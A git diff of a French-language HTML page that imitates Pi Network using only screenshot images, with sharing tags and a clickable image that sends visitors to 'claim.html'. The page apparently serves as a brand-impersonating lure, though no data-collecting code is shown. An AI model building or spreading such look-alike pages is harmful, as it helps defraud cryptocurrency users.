@@ -5,21 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Pi Network - La Cryptomonnaie Accessible</title>
     
-    <!-- Balises Open Graph pour l'aperçu Facebook -->
+    <!-- Balises Open Graph avec CDN d'images -->
     <meta property="og:title" content="Pi Network - Rejoignez la Révolution Crypto">
-    <meta property="og:description" content="Découvrez Pi Network, la première cryptomonnaie que vous pouvez miner sur votre téléphone. Rejoignez des millions de pionniers dans le monde!">
-    <meta property="og:image" content="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_204937227.jpg?raw=true">
+    <meta property="og:description" content="Découvrez Pi Network, la première cryptomonnaie que vous pouvez miner sur votre téléphone">
+    <meta property="og:image" content="https://i.imgur.com/YOUR_IMAGE_ID.jpg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://votresite.com">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Pi Network">
-    
-    <!-- Balises Twitter Card (optionnel mais recommandé) -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Pi Network - Rejoignez la Révolution Crypto">
-    <meta name="twitter:description" content="Découvrez Pi Network, la première cryptomonnaie que vous pouvez miner sur votre téléphone.">
-    <meta name="twitter:image" content="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_204937227.jpg?raw=true">
     
     <style>
         * {
@@ -31,7 +25,6 @@
         body {
             background-color: #000;
             min-height: 100vh;
-            /* Désactiver le zoom et le défilement tactile */
             touch-action: pan-x pan-y;
             -webkit-touch-callout: none;
             -webkit-user-select: none;
@@ -40,28 +33,20 @@
             -ms-user-select: none;
             user-select: none;
             overflow-x: hidden;
-            position: relative;
-        }
-        
-        html {
-            touch-action: manipulation;
         }
         
         .main-image, .continuation-image {
             width: 100%;
             height: auto;
             display: block;
-            /* Supprime tout espace entre les images */
             vertical-align: bottom;
         }
         
         .footer {
-            /* Fixe le footer en bas de l'écran */
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
-            /* Place le footer au-dessus des autres éléments */
             z-index: 10;
         }
         
@@ -71,62 +56,31 @@
             display: block;
         }
         
-        /* Conteneur pour l'image d'aperçu Facebook (complètement masqué) */
-        .facebook-preview-container {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            opacity: 0;
-            z-index: -1000;
-        }
-        
-        /* Image d'aperçu Facebook optimisée */
-        .facebook-preview-image {
-            width: 1200px;
-            height: 630px;
-            object-fit: contain;
-            background-color: #000;
+        /* Masquage complet de l'image d'aperçu */
+        .og-image {
+            display: none !important;
         }
     </style>
 </head>
 <body>
-    <!-- Conteneur pour l'image d'aperçu Facebook (masqué) -->
-    <div class="facebook-preview-container" aria-hidden="true">
-        <img class="facebook-preview-image" 
-             src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_204937227.jpg?raw=true" 
-             alt="Aperçu Pi Network">
-    </div>
+    <!-- Image OG masquée -->
+    <img class="og-image" 
+         src="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg" 
+         alt="Pi Network Preview">
     
-    <!-- Image principale cliquable -->
+    <!-- Contenu principal -->
     <img class="main-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
-         alt="Image principale Pi Network" 
+         alt="Image principale" 
          onclick="window.location.href='claim.html'">
     
-    <!-- Image de continuation -->
     <img class="continuation-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
-         alt="Suite de l'image Pi Network">
+         alt="Suite de l'image">
     
-    <!-- Pied de page fixe -->
     <footer class="footer">
         <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
-             alt="Pied de page Pi Network">
+             alt="Pied de page">
     </footer>
-
-    <script>
-        // Script pour forcer le chargement de l'image d'aperçu Facebook
-        document.addEventListener('DOMContentLoaded', function() {
-            const previewImage = document.querySelector('.facebook-preview-image');
-            if (previewImage) {
-                // Forcer le chargement de l'image
-                const img = new Image();
-                img.src = previewImage.src;
-            }
-        });
-    </script>
 </body>
 </html>
